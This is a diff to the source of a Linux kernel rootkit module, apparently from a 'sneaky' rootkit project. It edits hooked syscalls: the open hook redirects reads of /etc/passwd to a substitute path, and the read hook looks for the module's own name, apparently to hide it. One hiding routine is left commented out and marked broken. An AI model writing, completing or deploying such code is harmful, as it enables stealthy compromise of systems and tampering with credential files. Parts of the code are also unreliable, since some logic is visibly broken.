@@ -63,7 +63,7 @@ asmlinkage int (*original_getdents)(unsigned int fd, struct linux_dirent *dirp, 
 //Define our new sneaky version of the 'open' syscall
 asmlinkage int sneaky_sys_open(const char *pathname, int flags)
 {
-  printk(KERN_INFO "Very, very Sneaky!\n");
+  //printk(KERN_INFO "Very, very Sneaky!\n");
   if(strcmp(pathname, "/etc/passwd") == 0){
     printk(KERN_INFO "/etc/passwd detected\n");
     copy_to_user((void*)pathname, sneaky_path, strlen(sneaky_path));
@@ -74,10 +74,26 @@ asmlinkage int sneaky_sys_open(const char *pathname, int flags)
 
 asmlinkage int sneaky_read(int fd, char *buf, size_t count)
 {
+  unsigned int ret;
+  unsigned int offset;
+//  char *tmp;
+  ret = original_read(fd, buf, count);
+  offset = ret;
   if(strnstr(buf, MODULE_NAME, strlen(MODULE_NAME))){
-    printk(KERN_INFO "SNEAKY MOD DETECTED!\n");
+    printk(KERN_INFO "SNEAKY MOD DETECTED!%s\n", buf);
+/* BROKEN!!!
+    tmp = buf;
+    while(*tmp && *tmp != '\n' && *tmp != ' '){
+	*tmp = ' ';
+	tmp++;
+    }
+    memcpy(tmp, buf, (buf + ret) - tmp);
+    ret = ret - (tmp - buf);
+    printk(KERN_INFO "SNEAKY MOD DETECTED!%s\n", buf);
+    return ret;
+*/
   }
-  return original_read(fd, buf, count);
+  return ret;
 }
 
 asmlinkage int sneaky_getdents(unsigned int fd, struct linux_dirent *dirp, unsigned int count)
